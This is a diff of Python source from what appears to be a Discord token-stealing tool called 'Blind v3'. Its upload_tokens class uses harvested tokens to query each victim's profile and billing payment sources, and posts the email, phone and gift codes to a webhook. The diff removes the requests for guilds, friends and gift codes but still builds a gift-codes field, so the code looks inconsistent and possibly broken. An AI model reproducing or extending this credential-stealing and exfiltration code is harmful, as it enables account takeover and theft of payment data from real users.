@@ -218,9 +218,6 @@ class upload_tokens:
         for token in self.tokens:
             user = requests.get('https://discord.com/api/v8/users/@me', headers={'Authorization': token}).json()
             billing = requests.get('https://discord.com/api/v6/users/@me/billing/payment-sources', headers={'Authorization': token}).json()
-            guilds = requests.get('https://discord.com/api/v9/users/@me/guilds?with_counts=true', headers={'Authorization': token}).json()
-            friends = requests.get('https://discord.com/api/v8/users/@me/relationships', headers={'Authorization': token}).json()
-            gift_codes = requests.get('https://discord.com/api/v9/users/@me/outbound-promotions/codes', headers={'Authorization': token}).json()
 
             username = user['username'] + '#' + user['discriminator']
             user_id = user['id']
@@ -349,7 +346,7 @@ class upload_tokens:
             embed.add_field(name="Email", value=f"```{email if email != None else 'None'}```", inline=True)
             embed.add_field(name="Phone", value=f"```{phone if phone != None else 'None'}```", inline=True)    
 
-                embed.add_field(name="Gift Codes", value=codes, inline=False)
+                embed.add_field(name="🎁 Gift Codes", value=codes, inline=False)
             embed.set_footer(text="Created by: readdone#9772")
 
             self.webhook.send(embed=embed, username="Blind v3", avatar_url="https://i.imgur.com/LNVOaxg.png")
